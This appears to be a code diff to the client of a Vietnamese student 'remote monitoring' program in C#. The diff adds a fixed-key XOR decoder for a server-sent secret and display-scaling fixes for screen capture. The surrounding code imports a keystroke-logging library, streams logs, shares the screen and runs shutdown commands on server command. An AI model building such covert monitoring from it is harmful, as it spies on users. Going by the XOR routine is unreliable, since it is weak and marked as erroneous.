@@ -15,6 +15,7 @@ using System.Threading;
 using System.Drawing.Imaging;
 using System.Runtime.Serialization.Formatters.Binary;
 
+using System.Runtime.InteropServices;
 using Keystroke.API;
 
 namespace Client
@@ -31,6 +32,7 @@ namespace Client
         private Thread ShareScreen;
         bool stopsharing = false;
         string secret = "@#%^*&*)&*()*)(*)(*)"; // Initialize random char
+        const string KEY = "CHUONG TRINH THEO DOI TU XA";//"CHƯƠNG TRÌNH THEO DÕI TỪ XA";
 
         TcpClient logClient = new TcpClient();
         NetworkStream logStream;
@@ -42,6 +44,20 @@ namespace Client
             
             InitializeComponent();
             
+        }
+        public byte[] Xor(string a, string b)
+        {
+            char[] charAArray = a.ToCharArray();
+            char[] charBArray = b.ToCharArray();
+            byte[] result = new byte[27];
+            // Set length to be the length of the shorter string
+
+            for (int i = 0; i < 27; i++)
+            {
+                result[i] = (byte)(charAArray[i] ^ charBArray[i]) ; // Error here
+            }
+
+            return result;
         }
 
         void TakeCommandFromServer()
@@ -66,9 +82,10 @@ namespace Client
                         //screenStream = screenClient.GetStream();
                         if (command.StartsWith("secret"))
                         {
+                            
                             String[] separator = { ":" };
                             secret = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[1];
-                            MessageBox.Show(secret);
+                            MessageBox.Show(Encoding.ASCII.GetString(Xor(secret, KEY)));
                         }
                         if (command == "Share Screen")
                         {
@@ -128,12 +145,56 @@ namespace Client
         {
             System.Diagnostics.Process.Start("shutdown", command);
         }
+        #region Display Resolution
+
+        [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true, ExactSpelling = true)]
+        public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);
+
+        public enum DeviceCap
+        {
+            VERTRES = 10,
+            DESKTOPVERTRES = 117
+        }
+
+
+        public static double GetWindowsScreenScalingFactor(bool percentage = true)
+        {
+            //Create Graphics object from the current windows handle
+            Graphics GraphicsObject = Graphics.FromHwnd(IntPtr.Zero);
+            //Get Handle to the device context associated with this Graphics object
+            IntPtr DeviceContextHandle = GraphicsObject.GetHdc();
+            //Call GetDeviceCaps with the Handle to retrieve the Screen Height
+            int LogicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.VERTRES);
+            int PhysicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.DESKTOPVERTRES);
+            //Divide the Screen Heights to get the scaling factor and round it to two decimals
+            double ScreenScalingFactor = Math.Round(PhysicalScreenHeight / (double)LogicalScreenHeight, 2);
+            //If requested as percentage - convert it
+            if (percentage)
+            {
+                ScreenScalingFactor *= 100.0;
+            }
+            //Release the Handle and Dispose of the GraphicsObject object
+            GraphicsObject.ReleaseHdc(DeviceContextHandle);
+            GraphicsObject.Dispose();
+            //Return the Scaling Factor
+            return ScreenScalingFactor;
+        }
+
+        public static Size GetDisplayResolution()
+        {
+            var sf = GetWindowsScreenScalingFactor(false);
+            var screenWidth = Screen.PrimaryScreen.Bounds.Width * sf;
+            var screenHeight = Screen.PrimaryScreen.Bounds.Height * sf;
+            return new Size((int)screenWidth, (int)screenHeight);
+        }
+
+        #endregion
 
         private Image GrabDesktop()
         {
             Rectangle rect = Screen.PrimaryScreen.Bounds;
-            rect.Height = (int)(rect.Height * 1.25);
-            rect.Width = (int)(rect.Width * 1.25);
+            rect.Height = (int)(GetDisplayResolution().Height);
+            rect.Width = (int)(GetDisplayResolution().Width);
             //MessageBox.Show(rect.Size.ToString());
             Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
             Graphics screenGraphics = Graphics.FromImage(screenBitmap);
